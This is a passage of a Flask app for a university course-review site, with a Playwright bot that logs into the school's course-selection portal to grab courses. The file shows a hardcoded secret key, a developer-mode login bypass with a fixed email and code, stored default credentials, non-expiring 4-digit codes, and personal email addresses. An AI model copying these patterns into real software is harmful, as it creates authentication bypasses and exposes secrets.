from flask import Flask, render_template, jsonify, request
from playwright.sync_api import Playwright, sync_playwright

from functools import wraps
from flask import redirect, url_for, flash, make_response
from random import randint
from flask import session

from flask_sqlalchemy import SQLAlchemy

from transformers import pipeline, AutoTokenizer, AutoModelForSequenceClassification
import torch
from collections import defaultdict
import re



import hmac
import base64
import hashlib
import json
import time
import uuid
import requests
from urllib.parse import urlparse

import os
from werkzeug.utils import secure_filename
from PIL import Image
from datetime import datetime, timedelta
import math



import logging

import threading

import re
import smtplib  
from email.mime.multipart import MIMEMultipart  
from email.mime.text import MIMEText
app = Flask(__name__)
app.secret_key = '157451754'  # 用于 session 加密
ADMIN_EMAIL = "liwei008009@163.com"

DEV_MODE = True  # 设置为 True 启用开发者模式
DEFAULT_EMAIL = "2494546924@qq.com"  # 默认邮箱，用于开发者模式
DEFAULT_ENTERED_CODE = "2024SHU" # 默认邮箱验证码，用于开发者模式

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///courses.db'  # 使用SQLite数据库
db = SQLAlchemy(app)

UPLOAD_FOLDER = 'static/uploads/avatars'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def get_file_extension(filename):
    return filename.rsplit('.', 1)[1].lower()

def process_avatar(file, user_id):
    """处理并保存头像"""
    if not os.path.exists(UPLOAD_FOLDER):
        os.makedirs(UPLOAD_FOLDER)
        
    filename = secure_filename(f"avatar_{user_id}.{get_file_extension(file.filename)}")
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    
    # 保存并处理图片
    img = Image.open(file)
    img = img.convert('RGB')
    
    # 调整图片大小为200x200
    img.thumbnail((200, 200))
    
    # 如果不是正方形，进行裁剪
    if img.size[0] != img.size[1]:
        size = min(img.size)
        x = (img.size[0] - size) // 2
        y = (img.size[1] - size) // 2
        img = img.crop((x, y, x + size, y + size))
    
    img.save(filepath, quality=85, optimize=True)
    return f"/{filepath}"


def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session or not session['logged_in']:
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function


class CourseComment(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    course_number = db.Column(db.String(80), nullable=False)
    course_name = db.Column(db.String(120), nullable=False)
    teacher_name = db.Column(db.String(100), nullable=False)
    rating = db.Column(db.Float, nullable=False)
    comment_content = db.Column(db.String(250), nullable=True)
    post_time = db.Column(db.DateTime, default=datetime.utcnow)
    likes = db.Column(db.Integer, default=0)
    is_pinned = db.Column(db.Boolean, default=False)

    def __repr__(self):
        return f'<CourseComment {self.course_number}>'


class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    nickname = db.Column(db.String(50), nullable=True)
    avatar = db.Column(db.String(200), nullable=True)
    bio = db.Column(db.String(500), nullable=True)
    experience = db.Column(db.Integer, default=0)
    level = db.Column(db.Integer, default=1)
    join_date = db.Column(db.DateTime, default=datetime.utcnow)
    last_login = db.Column(db.DateTime)
    login_streak = db.Column(db.Integer, default=0)
    comments = db.relationship('CourseComment', backref='author', lazy=True)

    def calculate_level(self):
        """根据经验值计算等级"""
        experience_thresholds = {
            1: 0,      # 青铜会员
            2: 100,    # 白银会员
            3: 300,    # 黄金会员
            4: 600,    # 铂金会员
            5: 1000    # 钻石会员
        }
        for level, threshold in sorted(experience_thresholds.items(), reverse=True):
            if self.experience >= threshold:
                return level
        return 1

    def get_level_name(self):
        """获取等级名称"""
        level_names = {
            1: "青铜会员",
            2: "白银会员",
            3: "黄金会员",
            4: "铂金会员",
            5: "钻石会员"
        }
        return level_names.get(self.level, "普通会员")

    def get_next_level_exp(self):
        """获取下一级所需经验"""
        experience_thresholds = {
            1: 0,      # 青铜会员
            2: 100,    # 白银会员
            3: 300,    # 黄金会员
            4: 600,    # 铂金会员
            5: 1000    # 钻石会员
        }
        
        if self.level >= 5:
            return None
            
        return experience_thresholds[self.level + 1]
        
    def get_level_progress(self):
        """获取当前等级进度百分比"""
        if self.level >= 5:
            return 100
            
        current_level_exp = self.get_next_level_exp() or 0
        prev_level_exp = {
            1: 0,
            2: 100,
            3: 300,
            4: 600,
            5: 1000
        }[self.level]
        
        exp_needed = current_level_exp - prev_level_exp
        exp_gained = self.experience - prev_level_exp
        
        return min(100, math.floor((exp_gained / exp_needed) * 100))
        
    def get_total_likes(self):
        """获取用户获得的总点赞数"""
        return sum(comment.likes for comment in self.comments)
        
    def update_login_streak(self):
        """更新登录连续天数"""
        now = datetime.utcnow()
        
        if self.last_login:
            time_diff = now - self.last_login
            if time_diff <= timedelta(hours=48) and time_diff > timedelta(hours=12):
                self.login_streak += 1
            elif time_diff > timedelta(hours=48):
                self.login_streak = 1
        else:
            self.login_streak = 1
            
        self.last_login = now

@app.route('/profile', methods=['GET', 'POST'])
@login_required
def profile():
    user = User.query.filter_by(email=session.get('email')).first()
    if not user:
        return redirect(url_for('login'))
        
    if request.method == 'POST':
        try:
            # 处理昵称更新
            new_nickname = request.form.get('nickname')
            if new_nickname and new_nickname != user.nickname:
                user.nickname = new_nickname
                
            # 处理头像上传
            if 'avatar' in request.files:
                file = request.files['avatar']
                if file and allowed_file(file.filename):
                    if file.content_length and file.content_length > MAX_FILE_SIZE:
                        flash('文件大小不能超过5MB', 'error')
                    else:
                        avatar_path = process_avatar(file, user.id)
                        user.avatar = avatar_path
            
            db.session.commit()
            flash('个人资料更新成功', 'success')
            
        except Exception as e:
            db.session.rollback()
            flash('更新失败，请稍后重试', 'error')
            print(f"个人资料更新错误: {str(e)}")
            
        return redirect(url_for('profile'))
        
    return render_template('profile.html', user=user,email=session.get('email'), ADMIN_EMAIL=ADMIN_EMAIL)

# 路由：点赞评论
@app.route('/like_comment/<int:comment_id>', methods=['POST'])
@login_required
def like_comment(comment_id):
    comment = CourseComment.query.get_or_404(comment_id)
    try:
        comment.likes += 1
        # 给评论作者加经验
        author = User.query.get(comment.user_id)
        if author:
            author.experience += 2
            author.level = author.calculate_level()
        db.session.commit()
        return jsonify({'success': True, 'likes': comment.likes})
    except Exception as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500

# 路由：置顶/取消置顶评论
@app.route('/toggle_pin/<int:comment_id>', methods=['POST'])
@login_required
def toggle_pin_comment(comment_id):
    comment = CourseComment.query.get_or_404(comment_id)
    user = User.query.filter_by(email=session['email']).first()
    
    if user.level >= 4 and comment.user_id == user.id or session.get('email') == ADMIN_EMAIL:
        try:
            comment.is_pinned = not comment.is_pinned
            db.session.commit()
            return jsonify({'success': True, 'is_pinned': comment.is_pinned})
        except Exception as e:
            db.session.rollback()
            return jsonify({'error': str(e)}), 500
    return jsonify({'error': '权限不足'}), 403


with app.app_context():
    db.create_all()


@app.route('/submit_comment', methods=['POST'])
@login_required
def submit_comment():
    user = User.query.filter_by(email=session.get('email')).first()
    if not user:
        return redirect(url_for('login'))

    try:
        # 创建新评论
        new_comment = CourseComment(
            user_id=user.id,
            course_number=request.form['course_number'],
            course_name=request.form['course_name'],
            teacher_name=request.form['teacher_name'],
            rating=float(request.form['rating']),
            comment_content=request.form['comment_content']
        )

        # 计算经验奖励
        exp_gain = 10  # 基础经验
        if len(request.form['comment_content']) > 100:
            exp_gain += 5  # 长评论额外经验
        
        # 更新用户经验和等级
        old_level = user.level
        user.experience += exp_gain
        user.level = user.calculate_level()
        
        if user.level > old_level:
            flash(f'恭喜！您已升级到 {user.get_level_name()}！')

        db.session.add(new_comment)
        db.session.commit()
        return redirect(url_for('comments'))
    except Exception as e:
        db.session.rollback()
        return str(e), 500

@app.route('/comments')
@login_required
def comments():
    comments = CourseComment.query.all()
    return render_template('comments.html', comments=comments, email=session.get('email'), ADMIN_EMAIL=ADMIN_EMAIL)

@app.route('/delete_comment/<int:comment_id>', methods=['POST'])
@login_required
def delete_comment(comment_id):
    if session.get('email') == ADMIN_EMAIL:
        comment = CourseComment.query.get(comment_id)
        if comment:
            db.session.delete(comment)
            db.session.commit()
            return redirect(url_for('comments'))
        else:
            return "Comment not found", 404
    else:
        return "Access denied", 403

# 设置日志
logging.basicConfig(
    filename='sentiment_analysis.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('sentiment_analysis')

class SentimentAnalyzer:
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        with cls._lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
                cls._initialized = False
            return cls._instance

    def __init__(self):
        if not self._initialized:
            self.model_name = "uer/roberta-base-finetuned-jd-binary-chinese"
            self.sentiment_analyzer = None
            self._initialized = True
            self._load_model()

    def _load_model(self):
        try:
            if self.sentiment_analyzer is None:
                logger.info("开始加载模型...")
                tokenizer = AutoTokenizer.from_pretrained(self.model_name)
                model = AutoModelForSequenceClassification.from_pretrained(self.model_name)
                device = "cuda" if torch.cuda.is_available() else "cpu"
                model = model.to(device)
                self.sentiment_analyzer = pipeline(
                    "sentiment-analysis",
                    model=model,
                    tokenizer=tokenizer,
                    device=0 if device == "cuda" else -1
                )
                logger.info(f"模型加载成功！使用设备: {device}")
                return True
        except Exception as e:
            logger.error(f"模型加载失败: {str(e)}")
            return False

    def analyze_text(self, text):
        if not text or not isinstance(text, str):
            return '中性', 0.5

        try:
            if self.sentiment_analyzer is None and not self._load_model():
                return self._simple_sentiment_analysis(text)

            result = self.sentiment_analyzer(text)
            score = result[0]['score']
            
            sentiment_mapping = {
                (0.9, 1.0): '非常正面',
                (0.7, 0.9): '正面',
                (0.4, 0.7): '中性偏正面',
                (0.3, 0.4): '中性',
                (0.1, 0.3): '中性偏负面',
                (0.0, 0.1): '负面'
            }
            
            for (lower, upper), sentiment in sentiment_mapping.items():
                if lower <= score <= upper:
                    return sentiment, score
                    
            return '中性', score
            
        except Exception as e:
            logger.error(f"情感分析出错: {str(e)}")
            return self._simple_sentiment_analysis(text)

    def _simple_sentiment_analysis(self, text):
        positive_words = [
            '好', '优秀', '棒', '不错', '喜欢', '满意', '推荐', '值得', '清晰', '耐心',
            '认真', '专业', '细致', '热情', '负责', '精彩', '有趣', '生动', '精确', '完美',
            '出色', '优质', '高效', '便捷', '实用', '靠谱', '可靠', '创新', '卓越'
        ]
        negative_words = [
            '差', '糟', '烂', '不好', '失望', '浪费', '不满', '难懂', '不推荐', '模糊',
            '敷衍', '草率', '马虎', '冷漠', '不负责', '无聊', '枯燥', '混乱', '错误', '缺陷',
            '拖沓', '低效', '繁琐', '不实用', '不靠谱', '过时', '陈旧'
        ]
        
        text = clean_text(text)
        positive_count = sum(text.count(word) for word in positive_words)
        negative_count = sum(text.count(word) for word in negative_words)
        
        sentiment_rules = [
            (lambda p, n: p > n * 1.5, ('非常正面', 0.9)),
            (lambda p, n: p > n, ('正面', 0.7)),
            (lambda p, n: n > p * 1.5, ('负面', 0.2)),
            (lambda p, n: n > p, ('中性偏负面', 0.3)),
            (lambda p, n: True, ('中性', 0.5))
        ]
        
        for condition, (sentiment, score) in sentiment_rules:
            if condition(positive_count, negative_count):
                return sentiment, score

def analyze_aspects(text):
    aspect_keywords = {
        '教学质量': ['讲课', '讲授', '教学', '课堂', '授课', '教材', '知识点', '讲解', '教学方式', '教学水平', '专业水平'],
        '师生互动': ['提问', '互动', '解答', '答疑', '交流', '耐心', '态度', '关心', '辅导', '沟通'],
        '考核方式': ['考试', '考核', '作业', '测验', '评分', '分数', '成绩', '难度', '给分', '期末', '期中'],
        '课程内容': ['内容', '知识', '实用', '困难', '难度', '深度', '易懂', '收获', '干货', '充实', '有趣'],
        '课程组织': ['课件', 'PPT', '教材', '资料', '进度', '课程安排', '作业量', '组织'],
        '实践应用': ['实验', '实践', '案例', '项目', '应用', '操作', '练习', '动手'],
        '整体评价': ['推荐', '喜欢', '建议', '总体', '整体', '总的来说', '总而言之', '综上']
    }
    
    sentences = [s.strip() for s in re.split('[。！？!?]', text) if s.strip()]
    aspects = []
    
    for sentence in sentences:
        matched_aspects = []
        for aspect, keywords in aspect_keywords.items():
            matches = sum(2 if keyword in sentence else 0 for keyword in keywords)
            if matches > 0:
                matched_aspects.append((aspect, matches))
        
        if matched_aspects:
            best_aspect = max(matched_aspects, key=lambda x: x[1])[0]
            aspects.append({
                'sentence': sentence,
                'aspect': best_aspect
            })
        else:
            aspects.append({
                'sentence': sentence,
                'aspect': '整体评价'
            })
    
    return aspects

def analyze_comment(text):
    if not text or not isinstance(text, str):
        return {
            'returnCode': '1',
            'returnMsg': '无效的评论内容',
            'returnObj': []
        }
    
    try:
        logger.info(f"开始分析评论: {text[:100]}...")
        text = clean_text(text)
        aspects = analyze_aspects(text)
        analyzer = SentimentAnalyzer()
        returnObj = []
        
        for aspect_item in aspects:
            sentiment, confidence = analyzer.analyze_text(aspect_item['sentence'])
            returnObj.append({
                'Aspect': aspect_item['aspect'],
                'Opinion': aspect_item['sentence'],
                'Polarity': sentiment,
                'Confidence': confidence
            })
        
        logger.info("评论分析完成")
        return {
            'returnCode': '0',
            'returnMsg': 'success',
            'returnObj': returnObj
        }
        
    except Exception as e:
        logger.error(f"分析评论出错: {str(e)}")
        return {
            'returnCode': '1',
            'returnMsg': str(e),
            'returnObj': [{
                'Aspect': '整体评价',
                'Opinion': text,
                'Polarity': '中性',
                'Confidence': 0.5
            }]
        }

def generate_summary(analysis_results):
    summary = {
        'total_comments': len(analysis_results),
        'positive_count': 0,
        'negative_count': 0,
        'neutral_count': 0,
        'aspect_opinion': defaultdict(list),
        'aspect_statistics': defaultdict(lambda: {'positive': 0, 'negative': 0, 'neutral': 0})
    }
    
    sentiment_mapping = {
        '非常正面': 'positive',
        '正面': 'positive',
        '中性偏正面': 'positive',
        '中性': 'neutral',
        '中性偏负面': 'negative',
        '负面': 'negative'
    }
    
    try:
        for result in analysis_results:
            if not isinstance(result, dict) or 'returnObj' not in result:
                logger.warning("跳过无效的分析结果")
                continue

            for item in result.get('returnObj', []):
                polarity = item.get('Polarity', '中性')
                sent_category = sentiment_mapping.get(polarity, 'neutral')
                
                if sent_category == 'positive':
                    summary['positive_count'] += 1
                elif sent_category == 'negative':
                    summary['negative_count'] += 1
                else:
                    summary['neutral_count'] += 1
                
                aspect = item.get('Aspect')
                opinion = item.get('Opinion')
                
                if aspect and opinion:
                    summary['aspect_opinion'][aspect].append({
                        'opinion': opinion,
                        'polarity': polarity,
                        'confidence': item.get('Confidence', 0.5)
                    })
                    summary['aspect_statistics'][aspect][sent_category] += 1
        
        summary['aspect_opinion'] = dict(summary['aspect_opinion'])
        summary['aspect_statistics'] = dict(summary['aspect_statistics'])
        
    except Exception as e:
        logger.error(f"生成总结时出错: {str(e)}")
        
    return summary

def clean_text(text):
    if not isinstance(text, str):
        text = str(text)
    text = re.sub(r'\s+', ' ', text)
    text = re.sub(r'[^a-zA-Z0-9\u4e00-\u9fff。！？!?，,、\s]', '', text)
    text = text.strip()
    return text

# Flask路由处理函数
def search_comments(course_number):
    try:
        comments = CourseComment.query.filter_by(course_number=course_number).all()
        if not comments:
            return None, None, None
            
        average_rating = sum(comment.rating for comment in comments) / len(comments)
        analysis_results = [analyze_comment(comment.comment_content) for comment in comments]
        summary = generate_summary(analysis_results)
        
        return comments, average_rating, summary
        
    except Exception as e:
        logger.error(f"搜索评论时出错: {str(e)}")
        return None, None, None

# 在Flask应用中的使用示例：
@app.route('/search_comments', methods=['GET'])
@login_required
def search_comments_route():
    course_number = request.args.get('course_number')
    if not course_number:
        return redirect(url_for('index'))
        
    comments, average_rating, summary = search_comments(course_number)
    
    if comments is None:
        return render_template('comments.html',
                            error="获取评论时出现错误",
                            email=session.get('email'),
                            ADMIN_EMAIL=ADMIN_EMAIL)
                            
    return render_template('comments.html',
                        comments=comments or [],
                        average_rating=average_rating,
                        course_number=course_number,
                        email=session.get('email'),
                        ADMIN_EMAIL=ADMIN_EMAIL,
                        summary=summary)

@app.route('/summarize_comments', methods=['POST'])
def summarize_comments_route():
    try:
        comments_data = request.json.get('comments', [])
        if not comments_data:
            return jsonify({'error': '没有评论数据'}), 400
            
        analysis_results = [
            analyze_comment(comment_data.get('text', ''))
            for comment_data in comments_data
            if comment_data.get('text')
        ]
        
        summary = generate_summary(analysis_results)
        return jsonify(summary)
        
    except Exception as e:
        logger.error(f"总结评论时出错: {str(e)}")
        return jsonify({'error': '处理评论时出现错误'}), 500

data_dict = {
    "zhanghao": 23120000,
    "mima": "12344321",
    "semester": "2024-2025学年冬季学期",
    "timegap": 3,
    "multiCourseMode": 1,
    "scheduleTime": "18:31:00",
    "testMode": 0,
    "kechenghao": "03004493",
    "jiaoshihao": 1002,
    "jiaoshinam": "Ding",
    "kechengtim": "四7-8",
    "courseNo": 1,
    "teacheNo": 1,
    "teacheName": 1,
    "courseTime": 1,
    "kechenghao2": "03009999",
    "jiaoshihao2": 1001,
    "jiaoshinam2": "Ding",
    "kechengtim2": "四7-8",
    "courseNo2": 1,
    "teacheNo2": 1,
    "teacheName2": 1,
    "courseTime2": 0,
    "kechenghao3": "03001111",
    "jiaoshihao3": 1001,
    "jiaoshinam3": "Ding",
    "kechengtim3": "四7-8",
    "courseNo3": 1,
    "teacheNo3": 1,
    "teacheName3": 1,
    "courseTime3": 0,
}

key_mapping = {
    '账号': 'zhanghao',
    '密码': 'mima',
    '学期': 'semester',
    '时间间隔': 'timegap',
    '选课数量': 'multiCourseMode',
    '定时开始时间(请点击定时选课)': 'scheduleTime',
    '测试模式': 'testMode',
    '课程编号[甲]': 'kechenghao',
    '教师编号[甲]': 'jiaoshihao',
    '教师姓名[甲]': 'jiaoshinam',
    '课程时间[甲]': 'kechengtim',
    '开启课程编号[甲]': 'courseNo',
    '开启教师编号[甲]': 'teacheNo',
    '开启教师姓名[甲]': 'teacheName',
    '开启课程时间[甲]': 'courseTime',
    '课程编号[乙]': 'kechenghao2',
    '教师编号[乙]': 'jiaoshihao2',
    '教师姓名[乙]': 'jiaoshinam2',
    '课程时间[乙]': 'kechengtim2',
    '开启课程编号[乙]': 'courseNo2',
    '开启教师编号[乙]': 'teacheNo2',
    '开启教师姓名[乙]': 'teacheName2',
    '开启课程时间[乙]': 'courseTime2',
    '课程编号[丙]': 'kechenghao3',
    '教师编号[丙]': 'jiaoshihao3',
    '教师姓名[丙]': 'jiaoshinam3',
    '课程时间[丙]': 'kechengtim3',
    '开启课程编号[丙]': 'courseNo3',
    '开启教师编号[丙]': 'teacheNo3',
    '开启教师姓名[丙]': 'teacheName3',
    '开启课程时间[丙]': 'courseTime3',
}

# 逆映射字典，英文key到中文key
display_mapping = {v: k for k, v in key_mapping.items()}



@app.route('/')
@login_required
def index():
    # 将英文键转换为中文键以供前端显示
    user_data = session.get('user_data', {})
    cn_data = {display_mapping[k]: v for k, v in user_data.items()}
    return render_template('index.html', data=cn_data, email=session.get('email'), ADMIN_EMAIL=ADMIN_EMAIL)

def send_verification_code(email):
    verification_code = randint(1000, 9999)
    subject = '您的登录验证码'
    body = f'您的验证码是：{verification_code}，用于登录验证，请在10分钟内使用。'
    
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    
    try:
        with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, email, msg.as_string())
            return verification_code
    except Exception as e:
        print(f"发送邮件时发生错误: {e}")
        return None



@app.route('/send_code', methods=['POST'])
def send_code():
    email = request.form.get('email')
    if DEV_MODE and email == DEFAULT_EMAIL:
        session['email'] = email
        return jsonify({'message': '此为开发者邮箱，请直接输入密码'})
    if email:
        code = send_verification_code(email)
        if code:
            session['email'] = email
            session['verification_code'] = code
            return jsonify({'message': '验证码已发送到您的邮箱，请查收。'})
        else:
            return jsonify({'error': '验证码发送失败，请重试。'}), 500
    else:
        return jsonify({'error': '请提供邮箱地址。'}), 400

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = session.get('email')
        if not email:
            return make_response(render_template('login.html', toast_message='请先获取验证码。'))
        
        entered_code = request.form['code']

        if DEV_MODE and email == DEFAULT_EMAIL and entered_code == DEFAULT_ENTERED_CODE:
            # 检查用户是否存在，不存在则创建
            user = User.query.filter_by(email=email).first()
            if not user:
                user = User(
                    email=email,
                    nickname=email.split('@')[0],  # 使用邮箱前缀作为默认昵称
                    join_date=datetime.utcnow()
                )
                db.session.add(user)
                db.session.commit()
            
            # 开发者模式，使用默认邮箱直接登录
            session['logged_in'] = True
            session['email'] = email
            session['user_data'] = data_dict.copy()  # 初始化用户数据
            return redirect(url_for('index'))
        else:
            # 正常登录逻辑，需要验证码
            if entered_code == str(session.get('verification_code', '')):
                 # 检查用户是否存在，不存在则创建
                user = User.query.filter_by(email=email).first()
                if not user:
                    try:
                        user = User(
                            email=email,
                            nickname=email.split('@')[0],  # 使用邮箱前缀作为默认昵称
                            join_date=datetime.utcnow()
                        )
                        db.session.add(user)
                        db.session.commit()
                        #flash('账号已自动注册成功！')
                    except Exception as e:
                        db.session.rollback()
                        return render_template('login.html', toast_message='注册失败，请稍后重试。')
                session.pop('email', None)
                session.pop('verification_code', None)
                session['logged_in'] = True
                session['email'] = email
                session['user_data'] = data_dict.copy()  # 初始化用户数据
                # 更新用户的最后登录时间
                user.last_login = datetime.utcnow()
                db.session.commit()
                return redirect(url_for('index'))
            else:
                return render_template('login.html', toast_message='验证码错误或已过期，请重新获取。')
        # 如果是 GET 请求，直接渲染登录页面
    else:
        return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    session.pop('email', None)
    session.pop('user_data', None)  # 清除用户数据
    return redirect(url_for('login'))












@app.route('/data')
@login_required
def get_data():
    # 从 session 中获取当前用户的数据
    user_data = session.get('user_data', {})
    # 直接返回当前用户的数据
    return jsonify(user_data)

@app.route('/update', methods=['POST'])
@login_required
def update_data():
    data = request.get_json()
    user_data = session.get('user_data', {})
    user_data.update(data)  # 更新当前用户的数据
    session['user_data'] = user_data
    return jsonify({'message': 'Data updated successfully!', 'data': user_data})

browsers = {}
routes_to_urls = {
    '/open_bilibili': 'https://www.bilibili.com',
    '/open_google': 'https://www.google.com',
    '/open_youtube': 'https://www.youtube.com',

    '/open_course': 'https://oauth.shu.edu.cn/login/eyJ0aW1lc3RhbXAiOjE3Mjg3MzM1MDIxNjQ0MjIyOTYsInJlc3BvbnNlVHlwZSI6ImNvZGUiLCJjbGllbnRJZCI6IkU0MjJPQmsyNjExWTRiVUVPMjFnbTFPRjFSeGtGTFE2Iiwic2NvcGUiOiIxIiwicmVkaXJlY3RVcmkiOiJodHRwczovL2p3eGsuc2h1LmVkdS5jbi94c3hrL29hdXRoL2NhbGxiYWNrIiwic3RhdGUiOiIifQ==',
    '/open_helper': 'https://xk.shuosc.com/',
    '/open_test': 'https://newsso.shu.edu.cn/login/eyJ0aW1lc3RhbXAiOjE2OTk2MDA2Mzc3NzAxNDk3ODUsInJlc3BvbnNlVHlwZSI6ImNvZGUiLCJjbGllbnRJZCI6IkJ3Vk5IVVZZMTdZVTBjMEJVTjRWY2FDNjBLMzRkT1g1Iiwic2NvcGUiOiIiLCJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vY2ouc2h1LmVkdS5jbi9wYXNzcG9ydC9yZXR1cm4iLCJzdGF0ZSI6IiJ9',
}

@app.route('/open_course', methods=['POST'])
def open_course():
    return open_website('/open_course')

@app.route('/open_helper', methods=['POST'])
def open_helper():
    return open_website('/open_helper')

@app.route('/open_test', methods=['POST'])
def open_test():
    return open_website('/open_test')



@app.route('/open_bilibili', methods=['POST'])
def open_bilibili():
    return open_website('/open_bilibili')

@app.route('/open_google', methods=['POST'])
def open_google():
    return open_website('/open_google')

@app.route('/open_youtube', methods=['POST'])
def open_youtube():
    return open_website('/open_youtube')

def open_website(route):
    url = routes_to_urls.get(route)
    if url:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=False)
            page = browser.new_page()
            page.goto(url)
            time.sleep(1000)
            browser.close()
        return jsonify({'message': f'{url} 已打开'})
    else:
        return jsonify({'error': 'Invalid route'}), 404
    
@app.route('/get_cookie', methods=['POST'])
@login_required
def getcookie():
    # 从 session 中获取当前用户的数据
    user_data = session.get('user_data', {})

    # 提取用户数据
    zhanghao = str(user_data.get("zhanghao", "default_account"))
    mima = str(user_data.get("mima", "default_password"))
    semester = user_data.get("semester", "default_semester")
    multiCourseMode = int(user_data.get("multiCourseMode", 1))
    testMode = int(user_data.get("testMode", 0))
    timegap = int(user_data.get("timegap", 3))
    scheduleTime = user_data.get("scheduleTime", "default_schedule_time")

    # 提取课程信息
    kehenghao = user_data.get("kechenghao", "")
    jiaoshihao = user_data.get("jiaoshihao", "")
    jiaoshinam = user_data.get("jiaoshinam", "")
    kechengtim = user_data.get("kechengtim", "")
    courseNo = int(user_data.get("courseNo", 1))
    courseTime = int(user_data.get("courseTime", 1))
    teacheNo = int(user_data.get("teacheNo", 1))
    teacheName = int(user_data.get("teacheName", 1))

    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=False)
        context = browser.new_context()

        # Open new page
        page = context.new_page()
        page.goto("https://jwxk.shu.edu.cn")
        page.wait_for_load_state('load')
        time.sleep(2)
        page.get_by_placeholder("请输入学工号").click()
        page.get_by_placeholder("请输入学工号").fill(zhanghao)
        page.get_by_placeholder("请输入密码").click()
        page.get_by_placeholder("请输入密码").fill(mima)
        page.get_by_role("button", name="登录").click()



        storage = context.storage_state()

        # Close page
        page.close()

        # ---------------------
        context.close()
        browser.close()
    return jsonify({'message': 'Cookie 获取成功'})

@app.route('/rob_course', methods=['POST'])
@login_required
def run():
    # zhanghao=data_dict["zhanghao"]
    # zhanghao = str(zhanghao)
    # mima=data_dict["mima"]
    # mima = str(mima)
    # semester = data_dict["semester"]
    # multiCourseMode=int(data_dict["multiCourseMode"])
    # testMode=int(data_dict["testMode"])
    # timegap = data_dict["timegap"]
    # timegap = int(timegap)
    
    # scheduleTime = data_dict["scheduleTime"]

    # kehenghao = data_dict["kechenghao"]
    # jiaoshihao=data_dict["jiaoshihao"]
    # jiaoshinam=data_dict["jiaoshinam"]
    # kechengtim=data_dict["kechengtim"]
    # courseNo = int(data_dict["courseNo"])
    # courseTime = int(data_dict["courseTime"])
    # teacheNo = int(data_dict["teacheNo"])
    # teacheName = int(data_dict["teacheName"])

    # kehenghao=str(kehenghao)
    # jiaoshihao=str(jiaoshihao)

    # kehenghao2=data_dict["kechenghao2"]
    # jiaoshihao2 = data_dict["jiaoshihao2"]
    # jiaoshinam2 = data_dict["jiaoshinam2"]
    # kechengtim2 = data_dict["kechengtim2"]
    # courseNo2 = int(data_dict["courseNo2"])
    # courseTime2 = int(data_dict["courseTime2"])
    # teacheNo2 = int(data_dict["teacheNo2"])
    # teacheName2 = int(data_dict["teacheName2"])

    # kehenghao2 = str(kehenghao2)
    # jiaoshihao2 = str(jiaoshihao2)

    # kehenghao3=data_dict["kechenghao3"]
    # jiaoshihao3 = data_dict["jiaoshihao3"]
    # jiaoshinam3 = data_dict["jiaoshinam3"]
    # kechengtim3 = data_dict["kechengtim3"]
    # courseNo3 = int(data_dict["courseNo3"])
    # courseTime3 = int(data_dict["courseTime3"])
    # teacheNo3 = int(data_dict["teacheNo3"])
    # teacheName3 = int(data_dict["teacheName3"])

    # kehenghao3 = str(kehenghao3)
    # jiaoshihao3 = str(jiaoshihao3)


    # 从 session 中获取当前用户的数据
    user_data = session.get('user_data', {})

    # 提取用户数据
    zhanghao = str(user_data.get("zhanghao", "23120000"))
    mima = str(user_data.get("mima", "12344321"))
    semester = user_data.get("semester", "2024-2025春季学期")
    multiCourseMode = int(user_data.get("multiCourseMode", 1))
    testMode = int(user_data.get("testMode", 0))
    timegap = int(user_data.get("timegap", 3))
    scheduleTime = user_data.get("scheduleTime", "18:31:00")

    # 提取课程信息
    kehenghao = user_data.get("kechenghao", "")
    jiaoshihao = user_data.get("jiaoshihao", "")
    jiaoshinam = user_data.get("jiaoshinam", "")
    kechengtim = user_data.get("kechengtim", "")
    courseNo = int(user_data.get("courseNo", 1))
    courseTime = int(user_data.get("courseTime", 1))
    teacheNo = int(user_data.get("teacheNo", 1))
    teacheName = int(user_data.get("teacheName", 1))

    # 如果有多个课程模式，同样提取其他课程的信息
    kehenghao2 = user_data.get("kechenghao2", "")
    jiaoshihao2 = user_data.get("jiaoshihao2", "")
    jiaoshinam2 = user_data.get("jiaoshinam2", "")
    kechengtim2 = user_data.get("kechengtim2", "")
    courseNo2 = int(user_data.get("courseNo2", 1))
    courseTime2 = int(user_data.get("courseTime2", 1))
    teacheNo2 = int(user_data.get("teacheNo2", 1))
    teacheName2 = int(user_data.get("teacheName2", 1))

    kehenghao3 = user_data.get("kechenghao3", "")
    jiaoshihao3 = user_data.get("jiaoshihao3", "")
    jiaoshinam3 = user_data.get("jiaoshinam3", "")
    kechengtim3 = user_data.get("kechengtim3", "")
    courseNo3 = int(user_data.get("courseNo3", 1))
    courseTime3 = int(user_data.get("courseTime3", 1))
    teacheNo3 = int(user_data.get("teacheNo3", 1))
    teacheName3 = int(user_data.get("teacheName3", 1))



    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=False)
        context = browser.new_context()
        
        # Open new page
        page = context.new_page()
        page.goto("https://jwxk.shu.edu.cn")
        page.get_by_placeholder("请输入学工号").click()
        page.get_by_placeholder("请输入学工号").fill(zhanghao)
        page.get_by_placeholder("请输入密码").click()
        page.get_by_placeholder("请输入密码").fill(mima)
